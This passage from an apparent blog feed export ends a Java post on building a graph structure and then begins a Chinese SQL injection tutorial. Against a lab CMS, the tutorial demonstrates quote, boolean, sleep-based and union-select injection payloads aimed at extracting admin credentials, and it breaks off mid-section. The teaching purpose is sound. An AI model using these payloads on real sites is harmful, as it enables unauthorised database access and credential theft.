comment">//根据提供的三元素构建一个边</span><span class="token keyword">this</span><span class="token punctuation">.</span>weight<span class="token operator">=</span>weight<span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>from<span class="token operator">=</span>from<span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token keyword">to</span><span class="token operator">=</span><span class="token keyword">to</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="4-Graph类"><a href="#4-Graph类" class="headerlink" title="4.Graph类"></a>4.Graph类</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">base_graph</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashSet</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Graph</span> <span class="token punctuation">{</span><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">Node</span><span class="token punctuation">&gt;</span></span> nodes<span class="token punctuation">;</span><span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Edge</span><span class="token punctuation">&gt;</span></span> edges<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token class-name">Graph</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>nodes<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>edges<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="5-将二维矩阵表示的图转化为Graph形式的图"><a href="#5-将二维矩阵表示的图转化为Graph形式的图" class="headerlink" title="5.将二维矩阵表示的图转化为Graph形式的图"></a>5.将二维矩阵表示的图转化为Graph形式的图</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">base_graph</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GenerateGraphFromMatrix</span> <span class="token punctuation">{</span><span class="token comment">//matrix </span><span class="token comment">//weight from to</span><span class="token comment">/* * [4,1,3] * [5,2,6] * [1,2,3] */</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Graph</span> <span class="token function">createGraphFromMatrix</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> matrix<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">Graph</span> g<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Graph</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>matrix<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">int</span> weight<span class="token operator">=</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> from<span class="token operator">=</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token keyword">to</span><span class="token operator">=</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>g<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>from<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//如果没有节点编号就去创建节点</span>g<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>from<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">(</span>from<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>g<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>g<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token class-name">Node</span> fromNode <span class="token operator">=</span> g<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>from<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取from节点</span><span class="token class-name">Node</span> toNode<span class="token operator">=</span>g<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取to节点</span><span class="token class-name">Edge</span> edge<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Edge</span><span class="token punctuation">(</span>weight<span class="token punctuation">,</span> fromNode<span class="token punctuation">,</span> toNode<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//建立一条边</span>g<span class="token punctuation">.</span>edges<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>edge<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//放到g的边集合中</span>fromNode<span class="token punctuation">.</span>nexts<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>toNode<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//from节点添加下行节点</span>fromNode<span class="token punctuation">.</span>edges<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>edge<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//from 节点添加下行边</span>fromNode<span class="token punctuation">.</span>out<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//from节点出度++</span>toNode<span class="token punctuation">.</span>in<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//to节点入度++</span><span class="token punctuation">}</span><span class="token keyword">return</span> g<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> test <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token class-name">Graph</span> graph <span class="token operator">=</span> <span class="token function">createGraphFromMatrix</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"节点数:"</span><span class="token operator">+</span>graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"边数:"</span><span class="token operator">+</span>graph<span class="token punctuation">.</span>edges<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"1的入度:"</span><span class="token operator">+</span>graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>in<span class="token operator">+</span><span class="token string">",1的出度:"</span><span class="token operator">+</span>graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"1到3的代价:"</span><span class="token operator">+</span>graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>edges<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>weight<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"done!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2022/10/09/shu-ju-jie-gou-yu-suan-fa/tu-tu-de-tong-yong-jie-gou-biao-da-de-jian-li/1009-01.jpeg" alt="测试图例" style="zoom:50%;"><p>运行结果</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">节点数:4边数:31的入度:0,1的出度:11到3的代价:4done!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://github.com/si-xiao-kai/AlgorithmDataStructure_stu/tree/main/base_graph">完整代码见我的github</a></p><h1 id="6-小结"><a href="#6-小结" class="headerlink" title="6.小结"></a>6.小结</h1><p>本文介绍了一个非常有用的图结构的表达方法，方便在上面实现图的各种算法，并且可以很方便的将其他形式的图的表示如邻接表、邻接矩阵等转化过来，进而避免了在不同结构上重新实现图算法的繁琐操作。后续会陆续讲解基于本文定义的图结构实现的各种图算法。</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 算法 </tag>
            
            <tag> java </tag>
            
            <tag> 图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入基础</title>
      <link href="/2022/10/04/web-an-quan/sql-zhu-ru/"/>
      <url>/2022/10/04/web-an-quan/sql-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="一、-SQL注入简介"><a href="#一、-SQL注入简介" class="headerlink" title="一、 SQL注入简介"></a>一、 SQL注入简介</h1><h2 id="1-1-SQL简介"><a href="#1-1-SQL简介" class="headerlink" title="1.1 SQL简介"></a>1.1 SQL简介</h2><p>结构化查询语言 （Structured Query Language）是关系式数据库管理系统的标准语言（ANSI X3.135 - 1986），实际上不同数据库系统之间的SQL不能完全相互通用。</p><h3 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h3><ul><li><p>特点：明显的层次结构， 库名|表名|字段名|字段内容</p></li><li><p>例子：mysql、access、 Mssql、orcale</p></li></ul><h2 id="1-2-sql注入"><a href="#1-2-sql注入" class="headerlink" title="1.2 sql注入"></a>1.2 sql注入</h2><p> 一种常见的Web安全漏洞，攻击者利用这个漏洞，可以访问或修改数据，或者利用潜在的数据库漏洞进行攻击。</p><p><u>攻击者通过向【用户可控参数】中注入SQL语法，【破坏原有SQL结构】达到编写程序时意料之外结果的攻击行为。</u></p><ul><li>漏洞原理：</li></ul><p>1、程序编写者在处理程序和数据库交互时，使用字符串拼接的方式构造SQL语句。</p><p>2、未对用户可控参数进行足够的过滤便将参数内容拼接进入到SQL语句中。</p><h2 id="1-3-注入点可能存在的位置"><a href="#1-3-注入点可能存在的位置" class="headerlink" title="1.3 注入点可能存在的位置"></a>1.3 注入点可能存在的位置</h2><p>Web应用在获取用户数据的地方，只要带入数据库查询，都有存在SQL注入的可能，这些地方通常包括:</p><p>1）@GET数据</p><p>2）@POST数据</p><p>3）@Cookie数据</p><p>4）@HTTP 头部（HTTP 请求报文其他字段）</p><p>GPC是最常用的三种提交数据的方法。</p><h2 id="1-4-SQL注入漏洞的危害"><a href="#1-4-SQL注入漏洞的危害" class="headerlink" title="1.4 SQL注入漏洞的危害"></a>1.4 SQL注入漏洞的危害</h2><p>1）增删改查：操作数据库数据。</p><p>2）脱库：获取数据库中的多种信息(例如:管理员后台密码)，从而脱取数据库中内容(脱库)</p><p>3）提权：如果数据库权限分配存在问题，或者数据库本身存在缺陷，那么攻击者可以通过SQL注入漏洞直接写入webshell或者获取服务器系统权限。例如：mof提权｜udf提权</p><h2 id="1-5-SQL注入分类"><a href="#1-5-SQL注入分类" class="headerlink" title="1.5 SQL注入分类"></a>1.5 SQL注入分类</h2><p>⚠️：数据库中三种数据类型数字、文本、时间。</p><h3 id="1-5-1-从数据类型的角度分类"><a href="#1-5-1-从数据类型的角度分类" class="headerlink" title="1.5.1 从数据类型的角度分类"></a>1.5.1 从数据类型的角度分类</h3><p>数字型：数字型注入就是说注入点的数据，拼接到SQL语句中是以数字型出现的，即数据两边没有被单引号、双引号包括。</p><p>字符型：字符型注入正好相反。</p><h3 id="1-5-2-从注入手法的角度分类"><a href="#1-5-2-从注入手法的角度分类" class="headerlink" title="1.5.2 从注入手法的角度分类"></a>1.5.2 从注入手法的角度分类</h3><p>1）联合查询：UNION query SQL injection （可联合查询注入）</p><p>2）布尔盲注：Boolean-based blind SQL injection （布尔型注入）</p><p>3）延时注入：Time-based blind SQL inj ection （基于时间延迟注入）</p><p>4）报错注入：Error-based SQL injection （报错型注入）</p><p>5）堆叠查询：Stacked queries SQL injection （可多语句查询注入）</p><h3 id="1-5-3-从注入的位置角度分类"><a href="#1-5-3-从注入的位置角度分类" class="headerlink" title="1.5.3 从注入的位置角度分类"></a>1.5.3 从注入的位置角度分类</h3><ul><li><p>GET注入</p></li><li><p>POST注入</p></li><li><p>Cookie注入</p></li><li><p>HTTP其他头字段注入</p></li><li><p>【留言板注入</p></li><li><p>搜索框注入</p></li><li><p>…】</p></li></ul><h1 id="二、Mysql基础知识"><a href="#二、Mysql基础知识" class="headerlink" title="二、Mysql基础知识"></a>二、Mysql基础知识</h1><h2 id="2-1-mysql注释"><a href="#2-1-mysql注释" class="headerlink" title="2.1 mysql注释"></a>2.1 mysql注释</h2><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql"># 【HTTP头部注入】-- 【--空格、--+ URL注入、如果在URL注入中使用#，要将其编码为%23】/*...*/ /*!...*/ 【内联查询】<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-2-元数据"><a href="#2-2-元数据" class="headerlink" title="2.2 元数据"></a>2.2 元数据</h2><p>库名、表名、字段名等信息</p><h2 id="2-3-mysql元数据数据库（information-schema）"><a href="#2-3-mysql元数据数据库（information-schema）" class="headerlink" title="2.3 mysql元数据数据库（information_schema）"></a>2.3 mysql元数据数据库（information_schema）</h2><h3 id="2-3-1-information-schema的信息"><a href="#2-3-1-information-schema的信息" class="headerlink" title="2.3.1 information_schema的信息"></a>2.3.1 information_schema的信息</h3><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2024-12-05%2017.27.55.png" alt="information_schema的关键信息" style="zoom:40%;"><ul><li><p>表所属库的信息？tables-table_schema</p></li><li><p>字段所属的表名？columns-table_name</p></li><li><p>字段所属的库名？columns-table_schema</p></li><li><p>所有的表名？tables-table_name</p></li><li><p>所有的字段名？columns-column_name</p></li></ul><h4 id="EX：实验操作"><a href="#EX：实验操作" class="headerlink" title="EX：实验操作"></a>EX：实验操作</h4><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122161518766-2263322.png" alt="元数据库操作示例" style="zoom:90%;"><h3 id="5-5-4-Mysql-常用函数与参数"><a href="#5-5-4-Mysql-常用函数与参数" class="headerlink" title="5.5.4 Mysql 常用函数与参数"></a>5.5.4 Mysql 常用函数与参数</h3><p>常用函数列表：</p><table><thead><tr><th>=|&gt;|&gt;=|&lt;=|&lt;&gt;</th><th>比较运算符</th></tr></thead><tbody><tr><td>and|or</td><td>逻辑运算符  ⚠️：true 1 false 0，比较运算符和逻辑运算符的结果是 1和0.</td></tr><tr><td>version()</td><td>mysql  数据库版本</td></tr><tr><td>database()</td><td>当前数据库名</td></tr><tr><td>user()</td><td>用户名</td></tr><tr><td>current_user()</td><td>当前用户名</td></tr><tr><td>system_user()</td><td>系统用户名</td></tr><tr><td>@@datadir</td><td>数据库路径</td></tr><tr><td>@@versoin_compile_os</td><td>操作系统版本</td></tr><tr><td>length()</td><td>返回字符串的长度</td></tr><tr><td>substring()</td><td>截取字符串</td></tr><tr><td>substr()</td><td>1. 截取的字符串  2. 截取起始位置，从1开始计数  3. 截取长度</td></tr><tr><td>mid()</td><td></td></tr><tr><td>left()</td><td>从左侧开始取指定字符个数的字符串</td></tr><tr><td>concat()</td><td>没有分隔符的连接字符串</td></tr><tr><td>concat_ws()</td><td>含有分割符的连接字符串</td></tr><tr><td>group_concat()</td><td>连接一个组的字符串</td></tr><tr><td>ord()</td><td>返回ASCII 码</td></tr><tr><td>ascii()</td><td>返回ASCII 码</td></tr><tr><td>hex()</td><td>将字符串转换为十六进制</td></tr><tr><td>unhex()</td><td>hex 的反向操作</td></tr><tr><td>md5()</td><td>返回MD5 值</td></tr><tr><td>floor(x)</td><td>返回不大于x 的最大整数</td></tr><tr><td>round()</td><td>返回参数x 接近的整数</td></tr><tr><td>rand()</td><td>返回0-1 之间的随机浮点数</td></tr><tr><td>load_file()</td><td>读取文件，并返回文件内容作为一个字符串</td></tr><tr><td>sleep()</td><td>睡眠时间为指定的秒数</td></tr><tr><td>if(true,t,f)</td><td>if 判断</td></tr><tr><td>find_in_set()</td><td>返回字符串在字符串列表中的位置</td></tr><tr><td>benchmark()</td><td>指定语句执行的次数</td></tr><tr><td>name_const()</td><td>返回表作为结果</td></tr></tbody></table><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122162522971-2263927.png" alt="函数操作示例" style="zoom:90%;"><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122162852365-2264134.png" alt="比较运算符" style="zoom:80%;"><h1 id="三、注入点的判断"><a href="#三、注入点的判断" class="headerlink" title="三、注入点的判断"></a>三、注入点的判断</h1><h2 id="3-1-以CMS站点为例"><a href="#3-1-以CMS站点为例" class="headerlink" title="3.1 以CMS站点为例"></a>3.1 以CMS站点为例</h2><p>（win2008-cms站点 -注入点判断）</p><p>为了演示SQL注入的四大基本手法，我们以CMS为例。 [http: //ip/ cms/]</p><ul><li>环境：</li></ul><p>​        环境-win2008-cms站点 </p><p>​        攻击者：win10 ICS 工具：【御剑-后台扫描】</p><ul><li>目标：</li></ul><p>​通过SQL注入漏洞获得后台管理员帐密并成功登录系统。</p><p>​后台地址[<a href="http://172.16.132.138/cms/admin/]">http://172.16.132.138/cms/admin/]</a></p><ul><li><p>四大基本手法可行性判断</p><ul><li>联合查询</li><li>报错注入</li><li>布尔盲注</li><li>延时注入</li></ul><p>对链接 [http:/ /172.16.132.138/ cms/show. php?id=33]是否是注入点进行判断。</p></li></ul><h2 id="3-2-数据库回显"><a href="#3-2-数据库回显" class="headerlink" title="3.2 数据库回显"></a>3.2 数据库回显</h2><p>当我们变换id参数(33+1|33-1) 的时候，发现同一个页面，show. php页面展现出不同的新闻内容。也就是说，数据库中的内容会回显到网页中来。初步判定，id参数会带入数据库查询，根据不同的id查询数据库，得到不同的新闻内容。猜测后台执行的SQL语句大致结构为:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> dbName <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-3-判断数字型还是字符型、是否可以进行报错注入"><a href="#3-3-判断数字型还是字符型、是否可以进行报错注入" class="headerlink" title="3.3 判断数字型还是字符型、是否可以进行报错注入"></a>3.3 判断数字型还是字符型、是否可以进行报错注入</h2><p>单引号</p><p>[?id=33’]</p><p>执行的SQL主语则变为</p><p>select * from tbName where id=33’ ; </p><p>页面报错，并且报错信息会回显在网页中，报错信息如下</p><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL</p><p>server version for the right syntax to use near ‘ ‘ ‘ at line 1</p><p>错误信息提示单引号位置出现错误，那么说明，SQL语句从头到参数33都是正确的。也就是说，我们添加的单引号是多余的。因此，可以断定参数33前面没有引号。则，此注入点(可能)为数字型注入。</p><blockquote><p><strong>数字型？字符型？</strong><br>    注意报错信息的原理：从第一个字符开始往后读，读到语法错误然后报错。<br>    上述报错信息说明，’”‘之前都是正确的。’’是报错信息的单引号。<br>    规律：报错信息不出现数字-数字型、报错信息出现数字-字符型。</p></blockquote><h2 id="3-4-判断布尔状态是否存在"><a href="#3-4-判断布尔状态是否存在" class="headerlink" title="3.4 判断布尔状态是否存在"></a>3.4 判断布尔状态是否存在</h2><ul><li>[and 1=1]</li></ul><p>[?id=33 and 1=1 – +]</p><p>可能得SQL语句为</p><p>select * from tbName where id=33 and 1=1 –+</p><p>页面正常。存在延时状态是否存在 </p><ul><li>[and 1=2]</li></ul><p>[?id=33 and 1=2 – -+]</p><p>可能得SQL语句</p><p>select * from dbName where id=33 and 1=2 –+</p><p>页面没有新闻内容，并且数据库没有报错。由于1=2是恒假式，也就是查询条件</p><p>[where id=33 and 1=2 –+]恒假，这样的SQL语句在数据库中执行后，没有返回结果，没有新闻内容。</p><p>反过来看，页面没有新闻内容，也就是SQL语句查询条件为假。也就是说，我们写的语句</p><p>[and 1=2 –+], 起到了将查询条件置为假的作用。</p><p>那么，可以通过构造语句来控制SQL语句的查询结果并且，SQL语句查询条件真假性，在页面回显中有体现。</p><h2 id="3-5-存在延时状态是否存在"><a href="#3-5-存在延时状态是否存在" class="headerlink" title="3.5 存在延时状态是否存在"></a>3.5 存在延时状态是否存在</h2><ul><li>[and sleep(5) ]</li></ul><p>[?id=33 and sleep(5)]</p><p>注入sleep(5)语句，可以通过网络时间线看到延时。</p><p>说明sleep(5)语句起到了作用。</p><p>综上，此连接存在SQL注入漏洞。</p><h2 id="EX：-CMS站点SQL注入漏洞存在性和注入点判断"><a href="#EX：-CMS站点SQL注入漏洞存在性和注入点判断" class="headerlink" title="EX： CMS站点SQL注入漏洞存在性和注入点判断"></a>EX： CMS站点SQL注入漏洞存在性和注入点判断</h2><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122163931252-2264775.png" alt="CMS站点SQL注入漏洞存在性和注入点判断" style="zoom:80%;"><h2 id="3-6-总结"><a href="#3-6-总结" class="headerlink" title="3.6 总结"></a>3.6 总结</h2><p>再赘述一遍。</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122164606984.png" alt="手工判断注入点的方法总结" style="zoom:80%;"><h1 id="四、联合查询注入"><a href="#四、联合查询注入" class="headerlink" title="四、联合查询注入"></a>四、联合查询注入</h1><h2 id="4-1-概述"><a href="#4-1-概述" class="headerlink" title="4.1 概述"></a>4.1 概述</h2><p>由于数据库中的内容会回显到页面中来，所以我们可以采用联合查询进行注入。 联合查询就是SQL语法中的union select 语句。 该语句会同时执行两条select语句，生成两张虚拟表，然后把查询到的结果进行拼接。 select ～～～ union select～～～ 由于虚拟表是二维结构，联合查询会”纵向”拼接，两张虚拟的表。<br>        联合查询的强大之处：【可以跨库跨表查询】。</p><h2 id="4-2-必要条件"><a href="#4-2-必要条件" class="headerlink" title="4.2 必要条件"></a>4.2 必要条件</h2><ul><li><p>两张虚拟的表具有相同的列数</p></li><li><p>虚拟表对应的列的数据类型相同</p></li></ul><h2 id="4-3-判断字段个数"><a href="#4-3-判断字段个数" class="headerlink" title="4.3 判断字段个数"></a>4.3 判断字段个数</h2><h3 id="4-3-1-order-by"><a href="#4-3-1-order-by" class="headerlink" title="4.3.1 order by"></a>4.3.1 order by</h3><ul><li>方法原理</li></ul><p>可以使用[order by]语句来判断当前select语句所查询的虚拟表的列数。 [order by]语句本意是按照某一列进行排序， 在mysql中可以使用数字来代替具体的列名，比如[order by 1] 就是按照第一列进行排序， 如果mysql没有找到对应的列，就会报错[Unknown co Lumn]。我们可以依次增加数字，直到数据库报错。</p><ul><li>案例：</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122165104614-2265467.png" alt="order by判断字段个数示例" style="zoom:80%;"><h3 id="4-3-2-union-select"><a href="#4-3-2-union-select" class="headerlink" title="4.3.2 union select"></a>4.3.2 union select</h3><p>union select null,null,—,null–+</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.33.4/cms/show.php?id<span class="token operator">=</span><span class="token number">35</span> union <span class="token keyword">select</span> null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--+http://192.168.33.4/cms/show.php?id<span class="token operator">=</span><span class="token number">35</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,3,4,5,6,7,8,9,10,11,12,13,14,15--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>案例</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122165338390-2265620.png" alt="union select判断字段个数示例" style="zoom:90%;"><ul><li>使用hackbar插件</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122165422148.png" alt="hackbar插件使用示例" style="zoom:80%;"><h2 id="4-4-判断数据显示位置"><a href="#4-4-判断数据显示位置" class="headerlink" title="4.4 判断数据显示位置"></a>4.4 判断数据显示位置</h2><p>得到字段个数之后，可以尝试构造联合查询语句。<br>       这里我们并不知道表名，根据mysql数据库特性，select语句在执行的过程中，并不需要指定表名。<br>       [?id=33 union select 1,2,3,4,5,6,7,8,9,10,11, 12,13,14,15–+]<br>       [?id=33 union select null, null, null, null, null, null, null, null, null, null, null, null, null, null,null–+]<br>      页面显示的是第一张虚拟表的内容，那么我们可以考虑让第一张虚拟表的查询条件为假，则显示第二条记录。因此构造SQL语句:<br>      [?id=33 and 1=2 union select 1,2,3,4,5,6,7,8,9, 10,11, 12,13,14,15 –+]<br>      [?id=-33 union select 1,2,3,4,5,6, 7,8,9,10, 11,12,13,14,15 –+]</p><ul><li>案例</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122165657390.png" alt="判断数据显示位置" style="zoom:80%;"><h2 id="4-6-数据库名和数据库版本信息获取"><a href="#4-6-数据库名和数据库版本信息获取" class="headerlink" title="4.6 数据库名和数据库版本信息获取"></a>4.6 数据库名和数据库版本信息获取</h2><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122165724657-2265846.png" alt="数据库名和数据库版本信息获取" style="zoom:80%;"><p>version()函数获取版本信息。</p><h2 id="4-7-获取目标数据库数据表名"><a href="#4-7-获取目标数据库数据表名" class="headerlink" title="4.7 获取目标数据库数据表名"></a>4.7 获取目标数据库数据表名</h2><h3 id="4-7-1-暴力破解的思路"><a href="#4-7-1-暴力破解的思路" 